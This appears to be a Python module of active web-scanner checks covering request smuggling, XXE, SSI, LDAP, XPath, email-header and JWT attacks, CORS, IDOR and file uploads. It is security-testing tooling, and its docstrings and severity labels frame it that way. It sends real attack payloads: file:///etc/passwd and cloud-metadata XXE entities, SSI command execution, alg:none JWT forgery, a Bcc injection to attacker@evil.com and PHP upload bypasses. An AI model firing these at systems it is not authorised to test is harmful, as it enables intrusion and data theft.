"""Extended scanner checks — 15 additional active checks for Burp parity.

Batch 1: HTTP/API (5) — smuggling, HPP, mass assignment, BOLA/IDOR, GraphQL
Batch 2: Injection (5) — LDAP, XML/XXE, email header, SSI, XPath
Batch 3: Auth/Logic (5) — JWT, deserialization, file upload, CORS subdomain, API version
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import logging
import re
import time
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import httpx

from models import ScanFinding

log = logging.getLogger("proxy-engine.scanner_ext")


# ═══════════════════════════════════════════════════════════════════════════════
# Batch 1 — HTTP / API checks
# ═══════════════════════════════════════════════════════════════════════════════

async def _check_http_request_smuggling(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """CL.TE and TE.CL desync via conflicting headers."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    target = f"{parsed.scheme}://{parsed.netloc}/"

    # CL.TE: Content-Length takes priority on front-end, Transfer-Encoding on back-end
    clte_body = "0\r\n\r\nSMUGGLED"
    try:
        resp = await client.post(
            target,
            headers={
                "Content-Length": str(len(clte_body)),
                "Transfer-Encoding": "chunked",
            },
            content=clte_body.encode(),
        )
        # Check for desync indicators
        if resp.status_code in (400, 501) or "bad request" in resp.text.lower():
            pass  # normal rejection, not vulnerable
        elif resp.status_code == 200 and "SMUGGLED" not in resp.text:
            findings.append(ScanFinding(
                template_id="custom-http-smuggling-clte",
                name="HTTP Request Smuggling (CL.TE potential)",
                severity="high",
                url=target,
                description="Server accepted conflicting Content-Length + Transfer-Encoding headers without error. Manual verification needed.",
                confidence="tentative",
                source="custom",
            ))
    except Exception:
        pass

    # TE.CL: Transfer-Encoding on front-end, Content-Length on back-end
    tecl_body = "1\r\nZ\r\nQ"
    try:
        resp = await client.post(
            target,
            headers={
                "Transfer-Encoding": "chunked",
                "Content-Length": "3",
            },
            content=tecl_body.encode(),
        )
        if resp.status_code == 200:
            findings.append(ScanFinding(
                template_id="custom-http-smuggling-tecl",
                name="HTTP Request Smuggling (TE.CL potential)",
                severity="high",
                url=target,
                description="Server accepted TE.CL desync payload. Manual verification needed.",
                confidence="tentative",
                source="custom",
            ))
    except Exception:
        pass

    return findings


async def _check_http_parameter_pollution(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Duplicate params with different values — detect HPP."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)

    # Add duplicate params to existing URL
    canary_a = "hpp_test_a"
    canary_b = "hpp_test_b"
    test_url = f"{url}{'&' if parsed.query else '?'}test={canary_a}&test={canary_b}"

    try:
        resp = await client.get(test_url)
        body = resp.text
        has_a = canary_a in body
        has_b = canary_b in body
        if has_a and not has_b:
            findings.append(ScanFinding(
                template_id="custom-hpp",
                name="HTTP Parameter Pollution",
                severity="medium",
                url=url,
                description=f"Server uses first occurrence of duplicate 'test' param. HPP may bypass input validation.",
                extracted=[f"reflected: {canary_a}, dropped: {canary_b}"],
                confidence="firm",
                source="custom",
            ))
        elif has_b and not has_a:
            findings.append(ScanFinding(
                template_id="custom-hpp",
                name="HTTP Parameter Pollution",
                severity="medium",
                url=url,
                description=f"Server uses last occurrence of duplicate 'test' param. HPP may bypass input validation.",
                extracted=[f"reflected: {canary_b}, dropped: {canary_a}"],
                confidence="firm",
                source="custom",
            ))
    except Exception:
        pass

    return findings


async def _check_mass_assignment(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Extra JSON fields (role, admin, is_admin, permissions) — detect mass assignment."""
    findings: list[ScanFinding] = []

    extra_fields = [
        {"role": "admin"}, {"admin": True}, {"is_admin": True},
        {"permissions": ["*"]}, {"user_type": "administrator"},
        {"privilege": "superuser"}, {"isStaff": True},
    ]

    for extra in extra_fields:
        try:
            resp = await client.post(
                url,
                json=extra,
                headers={"Content-Type": "application/json"},
            )
            if resp.status_code in (200, 201, 204):
                # Check if any field was accepted by looking at response
                body_lower = resp.text.lower()
                for k, v in extra.items():
                    if k.lower() in body_lower and str(v).lower() in body_lower:
                        findings.append(ScanFinding(
                            template_id="custom-mass-assignment",
                            name=f"Mass Assignment — {k}",
                            severity="high",
                            url=url,
                            description=f"Server accepted extra field '{k}={v}' and reflected it. Possible mass assignment / privilege escalation.",
                            extracted=[f"{k}={v}"],
                            confidence="tentative",
                            source="custom",
                        ))
                        break
        except Exception:
            pass

    return findings


async def _check_bola_idor(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Increment/decrement numeric ID params, compare responses for BOLA/IDOR."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)

    # Check URL path for numeric IDs
    segments = [s for s in parsed.path.split("/") if s]
    for i, seg in enumerate(segments):
        if re.match(r"^\d+$", seg):
            original_id = int(seg)
            for delta in [1, -1, 2, -2]:
                new_id = original_id + delta
                if new_id < 0:
                    continue
                new_segments = list(segments)
                new_segments[i] = str(new_id)
                new_path = "/" + "/".join(new_segments)
                new_url = urlunparse(parsed._replace(path=new_path))
                try:
                    resp = await client.get(new_url)
                    if resp.status_code == 200 and len(resp.text) > 50:
                        findings.append(ScanFinding(
                            template_id="custom-bola-idor",
                            name=f"Potential BOLA/IDOR",
                            severity="high",
                            url=url,
                            description=f"Changing path ID {original_id} → {new_id} returned 200 with {len(resp.text)} bytes. Verify access control.",
                            extracted=[f"original: {original_id}", f"tested: {new_id}", f"resp_len: {len(resp.text)}"],
                            confidence="tentative",
                            source="custom",
                        ))
                        break
                except Exception:
                    pass
            break  # only test first numeric segment

    # Check query params for numeric IDs
    if parsed.query:
        params = parse_qs(parsed.query, keep_blank_values=True)
        for name, values in params.items():
            if values and re.match(r"^\d+$", values[0]):
                original_id = int(values[0])
                for delta in [1, -1]:
                    new_id = original_id + delta
                    if new_id < 0:
                        continue
                    new_params = dict(params)
                    new_params[name] = [str(new_id)]
                    new_query = urlencode(new_params, doseq=True)
                    new_url = urlunparse(parsed._replace(query=new_query))
                    try:
                        resp = await client.get(new_url)
                        if resp.status_code == 200 and len(resp.text) > 50:
                            findings.append(ScanFinding(
                                template_id="custom-bola-idor",
                                name=f"Potential BOLA/IDOR — {name}",
                                severity="high",
                                url=url,
                                description=f"Changing param '{name}' from {original_id} to {new_id} returned 200. Verify access control.",
                                extracted=[f"param: {name}", f"original: {original_id}", f"tested: {new_id}"],
                                confidence="tentative",
                                source="custom",
                            ))
                            break
                    except Exception:
                        pass

    return findings


async def _check_graphql(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Detect GraphQL endpoints, test introspection, query depth, batch abuse."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    gql_paths = ["/graphql", "/graphql/v1", "/api/graphql", "/gql", "/query", "/v1/graphql"]

    for gql_path in gql_paths:
        gql_url = base + gql_path
        try:
            # Test introspection
            introspection_query = '{"query":"{ __schema { types { name } } }"}'
            resp = await client.post(
                gql_url,
                content=introspection_query,
                headers={"Content-Type": "application/json"},
            )
            if resp.status_code == 200 and "__schema" in resp.text:
                findings.append(ScanFinding(
                    template_id="custom-graphql-introspection",
                    name="GraphQL Introspection Enabled",
                    severity="low",
                    url=gql_url,
                    description="GraphQL introspection is enabled, exposing the full schema. Disable in production.",
                    extracted=["__schema accessible"],
                    confidence="confirmed",
                    source="custom",
                ))

                # Test batch queries
                batch = '[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]'
                try:
                    batch_resp = await client.post(gql_url, content=batch, headers={"Content-Type": "application/json"})
                    if batch_resp.status_code == 200:
                        try:
                            data = batch_resp.json()
                            if isinstance(data, list) and len(data) >= 3:
                                findings.append(ScanFinding(
                                    template_id="custom-graphql-batch",
                                    name="GraphQL Batch Query Enabled",
                                    severity="low",
                                    url=gql_url,
                                    description="GraphQL accepts batch queries. May be abused for brute-force or DoS.",
                                    confidence="confirmed",
                                    source="custom",
                                ))
                        except Exception:
                            pass
                except Exception:
                    pass

                break  # Found a working endpoint
        except Exception:
            continue

    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# Batch 2 — Injection variants
# ═══════════════════════════════════════════════════════════════════════════════

async def _check_ldap_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """LDAP metacharacters to detect injection."""
    findings: list[ScanFinding] = []

    payloads = ["*", ")(cn=*)", "*()|&'", "admin)(&)"]
    error_patterns = ["ldap", "invalid dn", "bad search filter", "javax.naming"]

    parsed = urlparse(url)
    if not parsed.query:
        return findings

    params = parse_qs(parsed.query, keep_blank_values=True)
    for name, values in params.items():
        for payload in payloads:
            new_params = dict(params)
            new_params[name] = [payload]
            new_query = urlencode(new_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            try:
                resp = await client.get(test_url)
                body_lower = resp.text.lower()
                for pat in error_patterns:
                    if pat in body_lower:
                        findings.append(ScanFinding(
                            template_id="custom-ldap-injection",
                            name=f"LDAP Injection — {name}",
                            severity="high",
                            url=url,
                            matched_at=f"url_param:{name}",
                            description=f"LDAP error pattern '{pat}' triggered by payload '{payload}' in param '{name}'.",
                            extracted=[pat],
                            confidence="firm",
                            source="custom",
                        ))
                        return findings
            except Exception:
                pass

    return findings


async def _check_xml_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """XXE entity expansion and external entities."""
    findings: list[ScanFinding] = []

    # XXE payloads
    xxe_payloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
    ]

    xxe_indicators = ["root:", "bin:", "[extensions]", "ami-id", "instance-id"]

    for payload in xxe_payloads:
        try:
            resp = await client.post(
                url,
                content=payload,
                headers={"Content-Type": "application/xml"},
            )
            for indicator in xxe_indicators:
                if indicator in resp.text:
                    findings.append(ScanFinding(
                        template_id="custom-xxe",
                        name="XML External Entity (XXE) Injection",
                        severity="critical",
                        url=url,
                        description=f"XXE payload triggered file read. Indicator '{indicator}' found in response.",
                        extracted=[indicator],
                        confidence="confirmed",
                        source="custom",
                    ))
                    return findings

            # Check for entity expansion DoS
            if resp.status_code == 500 or "entity" in resp.text.lower():
                findings.append(ScanFinding(
                    template_id="custom-xml-injection",
                    name="XML Injection (Entity Processing)",
                    severity="medium",
                    url=url,
                    description="Server processes XML entities. XXE may be possible with further testing.",
                    confidence="tentative",
                    source="custom",
                ))
                return findings
        except Exception:
            pass

    return findings


async def _check_email_header_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """CRLF + Bcc/Cc in email params."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    if not parsed.query:
        return findings

    email_params = ["email", "to", "from", "mail", "recipient", "sender", "contact"]
    params = parse_qs(parsed.query, keep_blank_values=True)

    for name in params:
        if name.lower() not in email_params:
            continue
        payload = "test@example.com%0d%0aBcc:attacker@evil.com"
        new_params = dict(params)
        new_params[name] = [payload]
        new_query = urlencode(new_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        try:
            resp = await client.get(test_url)
            if resp.status_code in (200, 302) and "bcc" not in resp.text.lower():
                # If no error about the injected header, it might have been processed
                findings.append(ScanFinding(
                    template_id="custom-email-header-injection",
                    name=f"Email Header Injection — {name}",
                    severity="medium",
                    url=url,
                    matched_at=f"url_param:{name}",
                    description=f"CRLF injection in email param '{name}' may allow Bcc/Cc header injection.",
                    confidence="tentative",
                    source="custom",
                ))
        except Exception:
            pass

    return findings


async def _check_ssi_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Server-Side Include injection in .shtml responses."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    if not parsed.query:
        return findings

    ssi_payloads = [
        '<!--#exec cmd="id"-->',
        '<!--#echo var="DOCUMENT_ROOT"-->',
        '<!--#include virtual="/etc/passwd"-->',
    ]

    params = parse_qs(parsed.query, keep_blank_values=True)
    for name, values in params.items():
        for payload in ssi_payloads:
            new_params = dict(params)
            new_params[name] = [payload]
            new_query = urlencode(new_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            try:
                resp = await client.get(test_url)
                # Check if SSI was executed
                if "uid=" in resp.text or "/var/www" in resp.text or "root:" in resp.text:
                    findings.append(ScanFinding(
                        template_id="custom-ssi-injection",
                        name=f"Server-Side Include Injection — {name}",
                        severity="high",
                        url=url,
                        matched_at=f"url_param:{name}",
                        description=f"SSI payload '{payload}' executed at param '{name}'.",
                        confidence="confirmed",
                        source="custom",
                    ))
                    return findings
            except Exception:
                pass

    return findings


async def _check_xpath_injection(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """XPath injection with error detection."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    if not parsed.query:
        return findings

    payloads = ["' or '1'='1", "' or ''='", "1 or 1=1", "'] | //user/*[1='"]
    error_patterns = ["xpath", "xmldocument", "simplexml", "lxml", "invalid predicate", "xmlparser"]

    params = parse_qs(parsed.query, keep_blank_values=True)
    for name, values in params.items():
        for payload in payloads:
            new_params = dict(params)
            new_params[name] = [payload]
            new_query = urlencode(new_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            try:
                resp = await client.get(test_url)
                body_lower = resp.text.lower()
                for pat in error_patterns:
                    if pat in body_lower:
                        findings.append(ScanFinding(
                            template_id="custom-xpath-injection",
                            name=f"XPath Injection — {name}",
                            severity="high",
                            url=url,
                            matched_at=f"url_param:{name}",
                            description=f"XPath error '{pat}' triggered by payload '{payload}' in param '{name}'.",
                            extracted=[pat],
                            confidence="firm",
                            source="custom",
                        ))
                        return findings
            except Exception:
                pass

    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# Batch 3 — Auth / Logic checks
# ═══════════════════════════════════════════════════════════════════════════════

async def _check_jwt_attacks(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """JWT alg:none, symmetric confusion, kid injection, expired acceptance."""
    findings: list[ScanFinding] = []

    # First, try to get a JWT from the response
    try:
        resp = await client.get(url)
    except Exception:
        return findings

    # Look for JWTs in response headers and body
    jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
    all_text = resp.text + "\n" + "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
    jwt_matches = jwt_re.findall(all_text)

    if not jwt_matches:
        return findings

    for jwt_token in jwt_matches[:1]:  # test first found JWT
        parts = jwt_token.split(".")
        if len(parts) < 2:
            continue
        try:
            # Decode header
            header_padded = parts[0] + "=" * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))
        except Exception:
            continue

        # Test alg:none
        none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
        none_token = f"{none_header}.{parts[1]}."
        try:
            resp2 = await client.get(url, headers={"Authorization": f"Bearer {none_token}"})
            if resp2.status_code == 200 and resp2.status_code != 401:
                findings.append(ScanFinding(
                    template_id="custom-jwt-alg-none",
                    name="JWT Algorithm None Accepted",
                    severity="critical",
                    url=url,
                    description="Server accepts JWT with alg:none, allowing signature bypass.",
                    extracted=[f"original_alg: {header.get('alg', 'unknown')}"],
                    confidence="firm",
                    source="custom",
                ))
        except Exception:
            pass

        # Test expired token reuse — decode payload to check exp
        try:
            payload_padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload_data = json.loads(base64.urlsafe_b64decode(payload_padded))
            exp = payload_data.get("exp", 0)
            if exp and exp < time.time():
                findings.append(ScanFinding(
                    template_id="custom-jwt-expired",
                    name="Expired JWT Accepted",
                    severity="medium",
                    url=url,
                    description=f"Server response included an expired JWT (exp={exp}). If still accepted, token expiry is not enforced.",
                    confidence="tentative",
                    source="custom",
                ))
        except Exception:
            pass

        # Test kid injection
        if "kid" in header:
            kid_inject = base64.urlsafe_b64encode(json.dumps({
                "alg": header.get("alg", "HS256"),
                "typ": "JWT",
                "kid": "../../../../../../dev/null",
            }).encode()).rstrip(b"=").decode()
            inject_token = f"{kid_inject}.{parts[1]}.{parts[2] if len(parts) > 2 else ''}"
            try:
                resp3 = await client.get(url, headers={"Authorization": f"Bearer {inject_token}"})
                if resp3.status_code == 200:
                    findings.append(ScanFinding(
                        template_id="custom-jwt-kid-injection",
                        name="JWT KID Injection",
                        severity="high",
                        url=url,
                        description="Server accepts JWT with path traversal in KID field.",
                        confidence="tentative",
                        source="custom",
                    ))
            except Exception:
                pass

    return findings


async def _check_insecure_deserialization(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Detect serialization patterns (Java/PHP/Python), send crafted payloads."""
    findings: list[ScanFinding] = []

    try:
        resp = await client.get(url)
    except Exception:
        return findings

    body = resp.text
    all_headers = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())

    # Detect serialization patterns
    patterns = {
        "java": [r"rO0AB", r"aced0005", r"java\.io\.serializable"],
        "php": [r"O:\d+:\"[a-zA-Z]", r"a:\d+:\{", r"s:\d+:\""],
        "python": [r"cPickle", r"pickle\.loads", r"\x80\x04\x95"],
        "dotnet": [r"AAEAAAD", r"TypeNameHandling", r"__type"],
    }

    for lang, pats in patterns.items():
        for pat in pats:
            if re.search(pat, body) or re.search(pat, all_headers):
                findings.append(ScanFinding(
                    template_id=f"custom-deserialization-{lang}",
                    name=f"Serialization Pattern Detected ({lang})",
                    severity="medium",
                    url=url,
                    description=f"Response contains {lang} serialization pattern (/{pat}/). May indicate insecure deserialization.",
                    extracted=[pat],
                    confidence="tentative",
                    source="custom",
                ))
                break

    return findings


async def _check_file_upload(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Content-type bypass, double extension, null byte in file uploads."""
    findings: list[ScanFinding] = []

    # Try to find upload endpoints
    try:
        resp = await client.get(url)
    except Exception:
        return findings

    # Check if page has file upload forms
    if 'type="file"' not in resp.text and 'type=file' not in resp.text:
        return findings

    # Find form action
    form_match = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', resp.text, re.I)
    if not form_match:
        return findings

    from urllib.parse import urljoin
    upload_url = urljoin(url, form_match.group(1))

    # Test content-type bypass
    test_files = [
        ("test.php", "application/x-php", "<?php echo 'test'; ?>"),
        ("test.php.jpg", "image/jpeg", "<?php echo 'test'; ?>"),
        ("test.phtml", "text/html", "<?php echo 'test'; ?>"),
    ]

    for filename, ct, content in test_files:
        try:
            files = {"file": (filename, content.encode(), ct)}
            resp = await client.post(upload_url, files=files)
            if resp.status_code in (200, 201, 302):
                body_lower = resp.text.lower()
                if "success" in body_lower or "upload" in body_lower:
                    findings.append(ScanFinding(
                        template_id="custom-file-upload",
                        name=f"File Upload — {filename}",
                        severity="high",
                        url=upload_url,
                        description=f"Server accepted file '{filename}' with content-type '{ct}'. May allow code execution.",
                        confidence="tentative",
                        source="custom",
                    ))
                    break
        except Exception:
            pass

    return findings


async def _check_cors_subdomain(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Test subdomain-based ACAO patterns (attacker.target.com)."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if not host:
        return findings

    # Test subdomain reflection
    evil_origins = [
        f"https://attacker.{host}",
        f"https://{host}.evil.com",
        f"https://evil-{host}",
        f"https://{host}%60attacker.com",
    ]

    for origin in evil_origins:
        try:
            resp = await client.get(url, headers={"Origin": origin})
            acao = resp.headers.get("access-control-allow-origin", "")
            acac = resp.headers.get("access-control-allow-credentials", "")
            if acao == origin:
                sev = "high" if acac.lower() == "true" else "medium"
                findings.append(ScanFinding(
                    template_id="custom-cors-subdomain",
                    name=f"CORS Subdomain/Variation Reflection",
                    severity=sev,
                    url=url,
                    description=f"Server reflects origin '{origin}' in ACAO header. Credentials: {acac}.",
                    extracted=[f"ACAO: {acao}", f"ACAC: {acac}"],
                    confidence="confirmed",
                    source="custom",
                ))
                return findings
        except Exception:
            pass

    return findings


async def _check_api_version_exposure(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Probe older API versions (/v1/ when /v3/ is current)."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    path = parsed.path

    # Detect current API version
    version_match = re.search(r'/v(\d+)/', path)
    if not version_match:
        return findings

    current_version = int(version_match.group(1))
    if current_version <= 1:
        return findings

    # Try older versions
    for v in range(1, current_version):
        old_path = re.sub(r'/v\d+/', f'/v{v}/', path)
        old_url = urlunparse(parsed._replace(path=old_path))
        try:
            resp = await client.get(old_url)
            if resp.status_code == 200 and len(resp.text) > 50:
                findings.append(ScanFinding(
                    template_id="custom-api-version-exposure",
                    name=f"Old API Version Accessible (v{v})",
                    severity="low",
                    url=old_url,
                    description=f"API v{v} endpoint is accessible (current: v{current_version}). May lack security fixes.",
                    extracted=[f"current: v{current_version}", f"accessible: v{v}"],
                    confidence="confirmed",
                    source="custom",
                ))
        except Exception:
            pass

    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# Export registry
# ═══════════════════════════════════════════════════════════════════════════════

EXTENDED_CHECKS: dict[str, object] = {
    # Batch 1 — HTTP/API
    "http_request_smuggling": _check_http_request_smuggling,
    "http_parameter_pollution": _check_http_parameter_pollution,
    "mass_assignment": _check_mass_assignment,
    "bola_idor": _check_bola_idor,
    "graphql": _check_graphql,
    # Batch 2 — Injection
    "ldap_injection": _check_ldap_injection,
    "xml_injection": _check_xml_injection,
    "email_header_injection": _check_email_header_injection,
    "ssi_injection": _check_ssi_injection,
    "xpath_injection": _check_xpath_injection,
    # Batch 3 — Auth/Logic
    "jwt_attacks": _check_jwt_attacks,
    "insecure_deserialization": _check_insecure_deserialization,
    "file_upload": _check_file_upload,
    "cors_subdomain": _check_cors_subdomain,
    "api_version_exposure": _check_api_version_exposure,
}
